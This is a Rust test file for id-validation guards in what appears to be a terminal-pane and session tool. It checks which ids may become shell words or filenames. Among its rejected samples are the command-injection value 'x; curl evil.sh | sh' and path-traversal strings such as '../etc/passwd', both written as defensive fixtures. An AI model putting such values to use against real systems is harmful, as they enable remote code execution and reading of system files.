//! The guards' own tests: for each value, the shapes that may become a shell
//! word, a filename or a URL segment, and the shapes that may not.

use super::{pane_file_is_safe, pane_is_safe, session_id_is_safe};

// --- pane_is_safe ------------------------------------------------------

#[test]
fn an_ordinary_pane_id_is_safe_to_interpolate() {
    assert!(pane_is_safe("pane-1.2_3"));
}

#[test]
fn a_herdr_pane_id_is_safe_colon_and_all_or_no_banner_can_focus_a_pane() {
    // herdr's real ids look like wW:p21. An allowlist without the colon
    // drops the pane from EVERY banner on this host and loses
    // click-to-focus, the feature the pane id exists for. A colon is inert
    // in a shell word: the danger set is ; | & $ ` newline and quotes.
    assert!(pane_is_safe("wW:p21"));
}

#[test]
fn a_pane_id_carrying_shell_metacharacters_is_refused() {
    assert!(!pane_is_safe("x; curl evil.sh | sh"));
}

#[test]
fn a_pane_id_carrying_a_single_metacharacter_is_refused() {
    for unsafe_pane in [
        "a$b", "a`b", "a&b", "a|b", "a;b", "a'b", "a\"b", "a b", "a\nb", "a/b",
    ] {
        assert!(
            !pane_is_safe(unsafe_pane),
            "{unsafe_pane} must not be treated as safe"
        );
    }
}

#[test]
fn an_empty_pane_id_is_refused_rather_than_treated_as_a_command() {
    assert!(!pane_is_safe(""));
}

#[test]
fn the_allowlist_is_ascii_so_a_letter_from_outside_it_is_refused() {
    // No exploit is claimed for an accented letter. The point of an
    // allowlist is that admitting a character is a deliberate act, and
    // relaxing the test to every unicode letter admits a hundred thousand
    // of them in one edit, none of them examined.
    assert!(!pane_is_safe("panée"));
}

// --- pane_file_is_safe -------------------------------------------------

#[test]
fn a_pane_id_that_names_a_file_keeps_its_colon_and_loses_its_parent_reference() {
    // THE COLON EARNS ITS PLACE HERE for the reason it does one predicate
    // up: herdr's real ids carry one, and refusing it would refuse every
    // lease an operator could ever take.
    assert!(pane_file_is_safe("wW:p21"));
    assert!(pane_file_is_safe("pane-1.2_3"));
    // AND THE PARENT REFERENCE LOSES ITS PLACE, because this one becomes a
    // path: a pane id spelling `..` would write outside the lease
    // directory.
    for refused in ["..", "../etc/passwd", "a..b", "a/b", "", "a;b", "a b"] {
        assert!(
            !pane_file_is_safe(refused),
            "{refused:?} must not name a lease file"
        );
    }
}

#[test]
fn a_pane_id_shaped_like_a_working_file_never_names_a_lease() {
    // A PANE ID CANNOT PRODUCE THIS SHAPE (a colon-bearing herdr id or a
    // `wW:p21` word never spells `.new.<digits>` or `.sweep.<digits>`), so
    // this refuses nothing real. It closes the read side: `working_owner`
    // would judge a lease named this way one of ITS OWN working files, so
    // a lease begun under `abc.new.1` would be swept by the wrong pid or
    // never released at all.
    assert!(!pane_file_is_safe("abc.new.1"));
    assert!(!pane_file_is_safe("abc.sweep.7"));
    assert!(
        pane_file_is_safe("a.new.b"),
        "the marker shape itself stays safe"
    );
}

// --- session_id_is_safe ------------------------------------------------

#[test]
fn an_ordinary_session_id_is_safe_as_a_filename() {
    assert!(session_id_is_safe("a1b2-c3d4_e5.f6"));
}

#[test]
fn a_session_id_carrying_a_path_separator_is_refused() {
    assert!(!session_id_is_safe("a/b"));
}

#[test]
fn a_session_id_carrying_a_parent_reference_is_refused_even_though_dots_are_allowed() {
    assert!(session_id_is_safe("a.b"));
    assert!(!session_id_is_safe("a..b"));
    assert!(!session_id_is_safe(".."));
    assert!(!session_id_is_safe("../etc/passwd"));
}

#[test]
fn a_session_id_carrying_a_colon_is_refused_unlike_a_pane_id() {
    assert!(!session_id_is_safe("a:b"));
}

#[test]
fn a_session_id_carrying_shell_metacharacters_or_spaces_is_refused() {
    for unsafe_id in ["a b", "a;b", "a$b", "a\nb", "a*b"] {
        assert!(
            !session_id_is_safe(unsafe_id),
            "{unsafe_id} must not be treated as safe"
        );
    }
}

#[test]
fn an_empty_session_id_is_refused_rather_than_naming_a_directory() {
    assert!(!session_id_is_safe(""));
}

#[test]
fn the_session_allowlist_is_ascii_too_because_a_filename_gets_normalised() {
    // Two ids that differ only in how an accent is composed are one file
    // on a normalising filesystem, so an ascii id is the one whose text
    // and whose filename agree.
    assert!(!session_id_is_safe("sessioné"));
}

#[test]
fn a_session_id_shaped_like_a_working_file_never_names_a_marker() {
    // THE SAME CLOSE AS THE PANE PREDICATE, for `blocked_marker` rather
    // than `lease_marker`: a session id UUIDs and harness-generated ids
    // cannot spell, so this refuses nothing a real hook payload carries.
    assert!(!session_id_is_safe("abc.new.1"));
    assert!(!session_id_is_safe("abc.sweep.7"));
    assert!(
        session_id_is_safe("a.new.b"),
        "the marker shape itself stays safe"
    );
}
